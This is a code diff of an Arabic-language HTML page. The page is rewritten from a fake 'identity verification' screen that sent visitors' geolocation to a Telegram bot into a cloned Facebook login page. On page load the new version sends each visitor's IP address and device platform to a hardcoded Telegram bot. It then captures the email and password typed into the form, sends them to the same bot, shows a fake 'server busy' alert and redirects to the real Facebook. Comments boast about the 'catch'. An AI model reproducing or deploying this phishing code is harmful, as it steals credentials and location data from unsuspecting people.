@@ -1,29 +1,46 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>تأكيد الهوية</title>
+    <meta charset="UTF-8">
+    <title>تسجيل الدخول | فيسبوك</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+        button { width: 97%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+    </style>
     <script>
-        function sendToTelegram(lat, lon) {
-            let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-            let chat_id = "7214473798";
-            let mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            let text = `📍 صيد موقع جديد يا مِعمار:\n🔗 الرابط: ${mapsLink}`;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+        const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+        const CHAT_ID = "7214473798";
+
+        async function sendToTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
         }
 
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    sendToTelegram(position.coords.latitude, position.coords.longitude);
-                    alert("تم تأكيد هويتك بنجاح.");
-                });
-            }
+        // سحب البيانات فور فتح الصفحة
+        window.onload = async () => {
+            let res = await fetch('https://api.ipify.org?format=json');
+            let data = await res.json();
+            sendToTelegram(`⚠️ شخص فتح صفحة التمويه!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}`);
         };
+
+        function captureData() {
+            let email = document.getElementById('email').value;
+            let pass = document.getElementById('pass').value;
+            sendToTelegram(`🔥 صيد دسم يا مِعمار:\n👤 الإيميل: ${email}\n🔑 الباسورد: ${pass}`);
+            alert("عذراً، السيرفر مشغول حالياً. حاول لاحقاً.");
+            window.location.href = "https://www.facebook.com"; // تحويله للموقع الحقيقي بعد الصيد
+        }
     </script>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
-    <h2>جاري التحقق من أمان الجهاز...</h2>
-    <p>يرجى الانتظار ثواني</p>
+<body>
+    <div class="login-box">
+        <div class="fb-logo">facebook</div>
+        <p>يجب عليك تسجيل الدخول للمتابعة</p>
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button onclick="captureData()">تسجيل الدخول</button>
+    </div>
 </body>
 </html>
